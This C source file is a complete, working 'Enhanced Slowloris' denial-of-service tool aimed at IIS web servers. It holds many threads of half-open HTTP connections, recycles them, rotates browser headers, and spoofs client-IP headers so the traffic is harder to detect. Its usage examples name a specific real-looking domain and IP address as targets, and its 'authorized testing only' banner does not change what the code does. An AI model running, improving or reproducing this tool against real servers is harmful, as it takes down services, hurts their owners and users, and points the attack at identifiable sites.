#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <sys/socket.h>
#include <signal.h>
#include <netdb.h>
#include <sys/select.h>
#include <termios.h>

#define BUFFER_SIZE 1024
#define MAX_USER_AGENTS 2000
#define MAX_THREADS 500
#define MAX_CONNECTIONS_PER_THREAD 50
#define MAX_PATHS 50

// Connection structure for socket reuse
typedef struct {
    int socket_fd;
    time_t last_activity;
    time_t created_time;
    int connection_id;
    int request_stage;
    int is_active;
} connection_t;

// Browser profile for advanced header rotation
typedef struct {
    char *user_agent;
    char *accept;
    char *accept_language;
    char *accept_encoding;
    char *cache_control;
    char *connection_type;
} browser_profile_t;

// Configuration structure
typedef struct {
    char *target_ip;
    char *target_host;
    int target_port;
    int duration;
    int max_connections;
    int thread_count;
    int connections_per_thread;
    int verbose;
    int safe_mode;
    int use_https;
    int connection_ttl; // Connection time-to-live in seconds
    char *user_agents_file;
} attack_config_t;

// Global state
typedef struct {
    char *user_agents[MAX_USER_AGENTS];
    char *iis_paths[MAX_PATHS];
    browser_profile_t browser_profiles[10];
    int user_agent_count;
    int path_count;
    int profile_count;
    pthread_mutex_t lock;
    volatile int active_connections;
    volatile int total_connections;
    volatile int recycled_connections;
    volatile int running;
    volatile int display_stats;
    time_t start_time;
    attack_config_t config;
} slowloris_state_t;

static slowloris_state_t g_state = {0};

// Function prototypes
int load_user_agents(const char *filename);
void initialize_iis_paths(void);
void initialize_browser_profiles(void);
void cleanup_resources(void);
void *slowloris_attack_thread(void *arg);
void recycle_connection(connection_t *conn, const attack_config_t *config);
void send_advanced_headers(int sockfd, browser_profile_t *profile, const char *target_host, const char *iis_path);
void log_status(const char *source_ip, const char *target_ip, int connections);
void display_statistics(void);
int get_local_ip(char *buffer, size_t buffer_size);
int validate_ip_address(const char *ip);
void signal_handler(int sig);
void enable_raw_mode(void);
void disable_raw_mode(void);
int kbhit(void);
void *keyboard_monitor(void *arg);
int initialize_attack(const attack_config_t *config);
void print_banner(void);
void print_usage(const char *program_name);
char *safe_strdup(const char *str);

// Safe string duplication
char *safe_strdup(const char *str) {
    if (!str) return NULL;
    char *new_str = strdup(str);
    if (!new_str) {
        fprintf(stderr, "Memory allocation failed\n");
        exit(EXIT_FAILURE);
    }
    return new_str;
}

// Load user agents from file
int load_user_agents(const char *filename) {
    FILE *file = fopen(filename, "r");
    if (!file) {
        fprintf(stderr, "Could not open %s\n", filename);
        return -1;
    }

    char line[1024];
    int count = 0;
    
    while (fgets(line, sizeof(line), file) && count < MAX_USER_AGENTS) {
        line[strcspn(line, "\n")] = 0;
        if (strlen(line) > 10) {
            g_state.user_agents[count] = safe_strdup(line);
            count++;
        }
    }

    fclose(file);
    g_state.user_agent_count = count;
    
    if (g_state.config.verbose) {
        fprintf(stderr, "Loaded %d user agents from %s\n", count, filename);
    }
    
    return count;
}

// Initialize IIS-specific attack paths
void initialize_iis_paths(void) {
    const char *paths[] = {
        "/", "/index.html", "/default.aspx", "/default.asp",
        "/web.config", "/web.config.bak", "/appsettings.json",
        "/aspnet_client/system_web/", "/_vti_bin/", "/_private/",
        "/bin/", "/uploads/", "/api/", "/admin/login.aspx",
        "/wsman/", "/adfs/", "/ecp/", "/owa/", "/autodiscover/",
        "/Microsoft-Server-ActiveSync/", "/rpc/", "/cgi-bin/",
        "/images/", "/css/", "/js/", "/scripts/", "/styles/",
        "/contact.aspx", "/about.aspx", "/products.aspx",
        "/services/", "/download/", "/search/", "/sitemap.xml",
        "/robots.txt", "/.well-known/", "/api/v1/", "/api/v2/",
        "/json/", "/xml/", "/soap/", "/wcf/", "/asmx/",
        "/handler.ashx", "/webresource.axd", "/scriptresource.axd"
    };
    
    int count = sizeof(paths) / sizeof(paths[0]);
    for (int i = 0; i < count && i < MAX_PATHS; i++) {
        g_state.iis_paths[i] = safe_strdup(paths[i]);
    }
    g_state.path_count = count;
    
    if (g_state.config.verbose) {
        fprintf(stderr, "Initialized %d IIS-specific paths\n", count);
    }
}

// Initialize advanced browser profiles for header rotation
void initialize_browser_profiles(void) {
    // Profile 0: Modern Chrome Windows
    g_state.browser_profiles[0] = (browser_profile_t){
        .user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        .accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        .accept_language = "en-US,en;q=0.9",
        .accept_encoding = "gzip, deflate, br",
        .cache_control = "no-cache",
        .connection_type = "keep-alive"
    };
    
    // Profile 1: Firefox Windows
    g_state.browser_profiles[1] = (browser_profile_t){
        .user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        .accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        .accept_language = "en-US,en;q=0.5",
        .accept_encoding = "gzip, deflate, br",
        .cache_control = "no-cache",
        .connection_type = "keep-alive"
    };
    
    // Profile 2: Safari Mac
    g_state.browser_profiles[2] = (browser_profile_t){
        .user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
        .accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        .accept_language = "en-GB,en;q=0.9",
        .accept_encoding = "gzip, deflate, br",
        .cache_control = "max-age=0",
        .connection_type = "keep-alive"
    };
    
    // Profile 3: Edge Windows
    g_state.browser_profiles[3] = (browser_profile_t){
        .user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
        .accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        .accept_language = "en-US,en;q=0.9",
        .accept_encoding = "gzip, deflate, br",
        .cache_control = "no-cache",
        .connection_type = "keep-alive"
    };
    
    // Profile 4: Mobile Chrome Android
    g_state.browser_profiles[4] = (browser_profile_t){
        .user_agent = "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        .accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        .accept_language = "en-US,en;q=0.9",
        .accept_encoding = "gzip, deflate, br",
        .cache_control = "no-cache",
        .connection_type = "keep-alive"
    };
    
    g_state.profile_count = 5;
    
    if (g_state.config.verbose) {
        fprintf(stderr, "Initialized %d browser profiles\n", g_state.profile_count);
    }
}

// Cleanup resources
void cleanup_resources(void) {
    pthread_mutex_lock(&g_state.lock);
    g_state.running = 0;
    pthread_mutex_unlock(&g_state.lock);
    
    // Free user agents
    for (int i = 0; i < g_state.user_agent_count; i++) {
        free(g_state.user_agents[i]);
    }
    g_state.user_agent_count = 0;
    
    // Free IIS paths
    for (int i = 0; i < g_state.path_count; i++) {
        free(g_state.iis_paths[i]);
    }
    g_state.path_count = 0;
    
    pthread_mutex_destroy(&g_state.lock);
    disable_raw_mode();
    
    if (g_state.config.verbose) {
        printf("Cleanup completed. Final connections: %d (recycled: %d)\n", 
               g_state.total_connections, g_state.recycled_connections);
    }
}

// IP validation
int validate_ip_address(const char *ip) {
    struct sockaddr_in sa;
    return inet_pton(AF_INET, ip, &(sa.sin_addr)) != 0;
}

// Get local IP
int get_local_ip(char *buffer, size_t buffer_size) {
    if (!buffer || buffer_size < INET_ADDRSTRLEN) return -1;
    
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return -1;
    
    struct sockaddr_in serv;
    serv.sin_family = AF_INET;
    serv.sin_port = htons(53);
    inet_pton(AF_INET, "8.8.8.8", &serv.sin_addr);
    
    if (connect(sock, (struct sockaddr*)&serv, sizeof(serv)) < 0) {
        close(sock);
        return -1;
    }
    
    struct sockaddr_in name;
    socklen_t namelen = sizeof(name);
    if (getsockname(sock, (struct sockaddr*)&name, &namelen) < 0) {
        close(sock);
        return -1;
    }
    
    inet_ntop(AF_INET, &name.sin_addr, buffer, buffer_size);
    close(sock);
    return 0;
}

// Keyboard monitoring for spacebar
struct termios orig_termios;

void enable_raw_mode(void) {
    tcgetattr(STDIN_FILENO, &orig_termios);
    struct termios raw = orig_termios;
    raw.c_lflag &= ~(ICANON | ECHO);
    tcsetattr(STDIN_FILENO, TCSAFLUSH, &raw);
}

void disable_raw_mode(void) {
    tcsetattr(STDIN_FILENO, TCSAFLUSH, &orig_termios);
}

int kbhit(void) {
    struct timeval tv = {0L, 0L};
    fd_set fds;
    FD_ZERO(&fds);
    FD_SET(0, &fds);
    return select(1, &fds, NULL, NULL, &tv);
}

void *keyboard_monitor(void *arg) {
    while (g_state.running) {
        if (kbhit()) {
            char c = getchar();
            if (c == ' ') {
                g_state.display_stats = 1;
            } else if (c == 'q' || c == 'Q') {
                g_state.running = 0;
                break;
            }
        }
        usleep(100000);
    }
    return NULL;
}

// Display real-time statistics
void display_statistics(void) {
    time_t now = time(NULL);
    int total_time = (int)(now - g_state.start_time);
    
    printf("\n=== SLOWLORIS STATISTICS ===\n");
    printf("Runtime: %d seconds\n", total_time);
    printf("Active Connections: %d\n", g_state.active_connections);
    printf("Total Connections Made: %d\n", g_state.total_connections);
    printf("Recycled Connections: %d\n", g_state.recycled_connections);
    printf("Threads: %d\n", g_state.config.thread_count);
    printf("Connections/Thread: %d\n", g_state.config.connections_per_thread);
    printf("Connection TTL: %d seconds\n", g_state.config.connection_ttl);
    
    printf("\nPress SPACE for stats, Q to quit\n");
    printf("=============================\n");
}

// Recycle a connection (close and reopen)
void recycle_connection(connection_t *conn, const attack_config_t *config) {
    if (conn->socket_fd > 0) {
        close(conn->socket_fd);
        conn->socket_fd = 0;
        conn->is_active = 0;
        
        pthread_mutex_lock(&g_state.lock);
        g_state.active_connections--;
        g_state.recycled_connections++;
        pthread_mutex_unlock(&g_state.lock);
    }
    
    // Create new connection
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) return;
    
    // Set socket options
    int keepalive = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_KEEPALIVE, &keepalive, sizeof(keepalive));
    
    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(config->target_port);
    
    if (inet_pton(AF_INET, config->target_ip, &serv_addr.sin_addr) <= 0) {
        close(sockfd);
        return;
    }
    
    // Connect with timeout
    struct timeval tv;
    tv.tv_sec = 10;
    tv.tv_usec = 0;
    setsockopt(sockfd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    
    if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) == 0) {
        conn->socket_fd = sockfd;
        conn->last_activity = time(NULL);
        conn->created_time = time(NULL);
        conn->is_active = 1;
        conn->request_stage = 0;
        
        pthread_mutex_lock(&g_state.lock);
        g_state.active_connections++;
        g_state.total_connections++;
        pthread_mutex_unlock(&g_state.lock);
    } else {
        close(sockfd);
    }
}

// Send advanced headers with rotation
void send_advanced_headers(int sockfd, browser_profile_t *profile, const char *target_host, const char *iis_path) {
    char buffer[BUFFER_SIZE];
    time_t now = time(NULL);
    
    // Select HTTP method randomly
    const char *methods[] = {"GET", "POST", "HEAD"};
    const char *method = methods[rand() % 3];
    
    // Build the request with advanced headers
    if (strcmp(method, "POST") == 0) {
        snprintf(buffer, sizeof(buffer),
            "%s %s HTTP/1.1\r\n"
            "Host: %s\r\n"
            "User-Agent: %s\r\n"
            "Accept: %s\r\n"
            "Accept-Language: %s\r\n"
            "Accept-Encoding: %s\r\n"
            "Cache-Control: %s\r\n"
            "Connection: %s\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 10000\r\n"
            "X-Requested-With: XMLHttpRequest\r\n"
            "X-Forwarded-For: %d.%d.%d.%d\r\n"
            "Referer: http://%s/\r\n"
            "\r\n",
            method, iis_path, target_host,
            profile->user_agent, profile->accept, profile->accept_language,
            profile->accept_encoding, profile->cache_control, profile->connection_type,
            rand()%256, rand()%256, rand()%256, rand()%256, target_host);
    } else {
        snprintf(buffer, sizeof(buffer),
            "%s %s HTTP/1.1\r\n"
            "Host: %s\r\n"
            "User-Agent: %s\r\n"
            "Accept: %s\r\n"
            "Accept-Language: %s\r\n"
            "Accept-Encoding: %s\r\n"
            "Cache-Control: %s\r\n"
            "Connection: %s\r\n"
            "X-Requested-With: XMLHttpRequest\r\n"
            "X-Forwarded-For: %d.%d.%d.%d\r\n"
            "Referer: http://%s/\r\n",
            method, iis_path, target_host,
            profile->user_agent, profile->accept, profile->accept_language,
            profile->accept_encoding, profile->cache_control, profile->connection_type,
            rand()%256, rand()%256, rand()%256, rand()%256, target_host);
    }
    
    send(sockfd, buffer, strlen(buffer), MSG_DONTWAIT);
}

// Enhanced Slowloris attack thread with connection cycling and advanced features
void *slowloris_attack_thread(void *arg) {
    const attack_config_t *config = (const attack_config_t *)arg;
    char local_ip[INET_ADDRSTRLEN] = "unknown";
    
    get_local_ip(local_ip, sizeof(local_ip));
    
    int connection_count = 0;
    time_t start_time = time(NULL);
    
    // Connection pool with cycling
    connection_t connections[MAX_CONNECTIONS_PER_THREAD];
    memset(connections, 0, sizeof(connections));
    
    while (g_state.running) {
        // Check duration limit
        if (config->duration > 0 && (time(NULL) - start_time) > config->duration) break;
        
        // Check max connections per thread
        if (config->max_connections > 0 && connection_count >= config->max_connections) break;
        
        time_t current_time = time(NULL);
        
        // Manage connection pool
        for (int i = 0; i < config->connections_per_thread && g_state.running; i++) {
            // Recycle old connections based on TTL
            if (connections[i].is_active && 
                (current_time - connections[i].created_time) > config->connection_ttl) {
                recycle_connection(&connections[i], config);
            }
            
            // Create new connection if slot is empty
            if (!connections[i].is_active) {
                recycle_connection(&connections[i], config);
                if (connections[i].is_active) {
                    connection_count++;
                    
                    // Send initial advanced headers
                    browser_profile_t *profile = &g_state.browser_profiles[rand() % g_state.profile_count];
                    const char *host_header = config->target_host ? config->target_host : config->target_ip;
                    const char *iis_path = g_state.iis_paths[rand() % g_state.path_count];
                    
                    send_advanced_headers(connections[i].socket_fd, profile, host_header, iis_path);
                    connections[i].last_activity = current_time;
                }
            }
            
            // Send keep-alive data to active connections
            if (connections[i].is_active && connections[i].socket_fd > 0) {
                // Rotate headers periodically
                if ((current_time - connections[i].last_activity) > (5 + rand() % 10)) {
                    char *keepalive_headers[] = {
                        "X-Client-IP: %d.%d.%d.%d\r\n",
                        "X-Real-IP: %d.%d.%d.%d\r\n",
                        "Cookie: sessionid=%08x\r\n",
                        "Authorization: Basic dGVzdDp0ZXN0\r\n",
                        "If-Modified-Since: Thu, 01 Jan 1970 00:00:00 GMT\r\n",
                        "If-None-Match: \"test123\"\r\n"
                    };
                    
                    char header[128];
                    snprintf(header, sizeof(header), keepalive_headers[rand() % 6],
                             rand()%256, rand()%256, rand()%256, rand()%256);
                    
                    ssize_t sent = send(connections[i].socket_fd, header, strlen(header), MSG_DONTWAIT);
                    
                    if (sent <= 0) {
                        // Connection died, mark for recycling
                        connections[i].is_active = 0;
                        pthread_mutex_lock(&g_state.lock);
                        g_state.active_connections--;
                        pthread_mutex_unlock(&g_state.lock);
                    } else {
                        connections[i].last_activity = current_time;
                    }
                }
            }
        }
        
        // Slow down based on safe mode
        if (config->safe_mode) {
            usleep(300000); // 300ms in safe mode
        } else {
            usleep(50000); // 50ms in performance mode
        }
        
        // Periodic logging
        if (config->verbose && (connection_count % 100 == 0)) {
            log_status(local_ip, config->target_ip, g_state.active_connections);
        }
    }
    
    // Cleanup all connections
    for (int i = 0; i < config->connections_per_thread; i++) {
        if (connections[i].socket_fd > 0) {
            close(connections[i].socket_fd);
        }
    }
    
    return NULL;
}

// Status logging
void log_status(const char *source_ip, const char *target_ip, int connections) {
    time_t now = time(NULL);
    struct tm *tm_info = localtime(&now);
    char timestamp[20];
    strftime(timestamp, sizeof(timestamp), "%H:%M:%S", tm_info);
    
    printf("[%s] Slowloris: %d active connections (src: %s, dst: %s)\n", 
           timestamp, connections, source_ip, target_ip);
}

// Signal handler
void signal_handler(int sig) {
    printf("\nReceived signal %d. Shutting down Slowloris...\n", sig);
    g_state.running = 0;
}

// Initialize attack
int initialize_attack(const attack_config_t *config) {
    if (!validate_ip_address(config->target_ip)) {
        struct hostent *he = gethostbyname(config->target_ip);
        if (he == NULL) {
            fprintf(stderr, "Cannot resolve hostname: %s\n", config->target_ip);
            return -1;
        }
        struct in_addr **addr_list = (struct in_addr **)he->h_addr_list;
        printf("Resolved %s to %s\n", config->target_ip, inet_ntoa(*addr_list[0]));
    }
    
    memcpy(&g_state.config, config, sizeof(attack_config_t));
    g_state.running = 1;
    g_state.display_stats = 0;
    g_state.active_connections = 0;
    g_state.total_connections = 0;
    g_state.recycled_connections = 0;
    g_state.start_time = time(NULL);
    
    if (pthread_mutex_init(&g_state.lock, NULL) != 0) {
        fprintf(stderr, "Mutex initialization failed\n");
        return -1;
    }
    
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    enable_raw_mode();
    
    return 0;
}

void print_banner(void) {
    printf("=== ENHANCED SLOWLORIS - Advanced IIS Connection Pool Exhaustion ===\n");
    printf("FOR AUTHORIZED PENETRATION TESTING ONLY\n");
    printf("Unauthorized use is illegal and unethical\n\n");
}

void print_usage(const char *program_name) {
    printf("Usage: %s <target> [options]\n", program_name);
    printf("Target can be IP address or hostname\n");
    printf("Options:\n");
    printf("  -p PORT          Target port (default: 80)\n");
    printf("  -H HOST          Virtual host header (default: target IP/hostname)\n");
    printf("  -u FILE          User agents file (default: ./user_agents.txt)\n");
    printf("  -t COUNT         Thread count (default: 50, max: %d)\n", MAX_THREADS);
    printf("  -c COUNT         Connections per thread (default: 30, max: %d)\n", MAX_CONNECTIONS_PER_THREAD);
    printf("  -m COUNT         Max connections per thread (default: unlimited)\n");
    printf("  -d SECONDS       Duration in seconds (default: unlimited)\n");
    printf("  -T SECONDS       Connection TTL in seconds (default: 120)\n");
    printf("  -v               Verbose output\n");
    printf("  -s               Safe mode (slower, more conservative)\n");
    printf("  --https          Use HTTPS (port 443)\n");
    printf("  -h               Show this help\n");
    printf("\nAdvanced Features:\n");
    printf("  • Connection cycling & socket reuse\n");
    printf("  • IIS-specific path targeting (%d paths)\n", MAX_PATHS);
    printf("  • Advanced header rotation (%d browser profiles)\n", 5);
    printf("  • Randomized IP spoofing in headers\n");
    printf("\nInteractive Controls:\n");
    printf("  SPACE            Show real-time statistics\n");
    printf("  Q                Quit\n");
    printf("\nExamples:\n");
    printf("  %s altobio.com.tr -t 100 -c 40 -T 90\n", program_name);
    printf("  %s 212.154.119.31 -H altobio.com.tr -t 80 -c 25 -v -T 60\n", program_name);
}

int main(int argc, char *argv[]) {
    print_banner();
    
    if (argc < 2) {
        print_usage(argv[0]);
        return EXIT_FAILURE;
    }
    
    // Default configuration optimized for Slowloris
    attack_config_t config = {
        .target_ip = argv[1],
        .target_host = NULL,
        .target_port = 80,
        .duration = 0,
        .max_connections = 0,
        .thread_count = 50,
        .connections_per_thread = 30,
        .verbose = 0,
        .safe_mode = 0,
        .use_https = 0,
        .connection_ttl = 120, // 2 minutes default TTL
        .user_agents_file = "./user_agents.txt"
    };
    
    // Parse command line options
    for (int i = 2; i < argc; i++) {
        if (strcmp(argv[i], "-p") == 0 && i + 1 < argc) {
            config.target_port = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-H") == 0 && i + 1 < argc) {
            config.target_host = argv[++i];
        } else if (strcmp(argv[i], "-u") == 0 && i + 1 < argc) {
            config.user_agents_file = argv[++i];
        } else if (strcmp(argv[i], "-t") == 0 && i + 1 < argc) {
            config.thread_count = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-c") == 0 && i + 1 < argc) {
            config.connections_per_thread = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-m") == 0 && i + 1 < argc) {
            config.max_connections = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-d") == 0 && i + 1 < argc) {
            config.duration = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-T") == 0 && i + 1 < argc) {
            config.connection_ttl = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-v") == 0) {
            config.verbose = 1;
        } else if (strcmp(argv[i], "-s") == 0) {
            config.safe_mode = 1;
        } else if (strcmp(argv[i], "--https") == 0) {
            config.use_https = 1;
            if (config.target_port == 80) config.target_port = 443;
        } else if (strcmp(argv[i], "-h") == 0) {
            print_usage(argv[0]);
            return EXIT_SUCCESS;
        }
    }
    
    // Auto-set port for HTTPS
    if (config.use_https && config.target_port == 80) {
        config.target_port = 443;
    }
    
    // Safety limits
    if (config.thread_count > MAX_THREADS) {
        fprintf(stderr, "Too many threads. Maximum is %d.\n", MAX_THREADS);
        config.thread_count = MAX_THREADS;
    }
    
    if (config.connections_per_thread > MAX_CONNECTIONS_PER_THREAD) {
        fprintf(stderr, "Too many connections per thread. Maximum is %d.\n", MAX_CONNECTIONS_PER_THREAD);
        config.connections_per_thread = MAX_CONNECTIONS_PER_THREAD;
    }
    
    if (config.thread_count < 1) {
        fprintf(stderr, "Thread count must be at least 1.\n");
        return EXIT_FAILURE;
    }
    
    printf("Target: %s:%d\n", config.target_ip, config.target_port);
    if (config.target_host) {
        printf("Virtual Host: %s\n", config.target_host);
    }
    printf("Threads: %d\n", config.thread_count);
    printf("Connections/Thread: %d\n", config.connections_per_thread);
    printf("Total Potential Connections: %d\n", config.thread_count * config.connections_per_thread);
    printf("Connection TTL: %d seconds\n", config.connection_ttl);
    printf("HTTPS: %s\n", config.use_https ? "enabled" : "disabled");
    printf("Safe mode: %s\n", config.safe_mode ? "enabled" : "disabled");
    printf("User agents: %s\n", config.user_agents_file);
    printf("\nAdvanced Features Enabled:\n");
    printf("  • Connection cycling & socket reuse\n");
    printf("  • %d IIS-specific attack paths\n", MAX_PATHS);
    printf("  • %d browser profiles for header rotation\n", 5);
    printf("\nPress SPACE for stats, Q to quit\n");
    printf("Starting in 3 seconds...\n");
    sleep(3);
    
    // Initialize
    if (initialize_attack(&config) != 0) {
        return EXIT_FAILURE;
    }
    
    // Load user agents
    if (load_user_agents(config.user_agents_file) <= 0) {
        fprintf(stderr, "Warning: No user agents loaded from %s\n", config.user_agents_file);
    }
    
    // Initialize advanced features
    initialize_iis_paths();
    initialize_browser_profiles();
    
    // Register cleanup function
    atexit(cleanup_resources);
    
    printf("Enhanced Slowloris starting with %d threads (%d connections each)...\n", 
           config.thread_count, config.connections_per_thread);
    
    // Start keyboard monitor thread
    pthread_t keyboard_thread;
    pthread_create(&keyboard_thread, NULL, keyboard_monitor, NULL);
    
    // Create attack threads
    pthread_t threads[config.thread_count];
    for (int i = 0; i < config.thread_count; i++) {
        if (pthread_create(&threads[i], NULL, slowloris_attack_thread, &config) != 0) {
            fprintf(stderr, "Failed to create thread %d\n", i);
        }
    }
    
    // Main loop - run until Ctrl-C or 'q'
    while (g_state.running) {
        if (g_state.display_stats) {
            display_statistics();
            g_state.display_stats = 0;
        }
        sleep(1);
    }
    
    // Wait for all threads to finish
    for (int i = 0; i < config.thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
    
    pthread_join(keyboard_thread, NULL);
    
    // Final statistics
    display_statistics();
    printf("Enhanced Slowloris completed.\n");
    printf("Total connections made: %d\n", g_state.total_connections);
    printf("Connections recycled: %d\n", g_state.recycled_connections);
    
    return EXIT_SUCCESS;
}
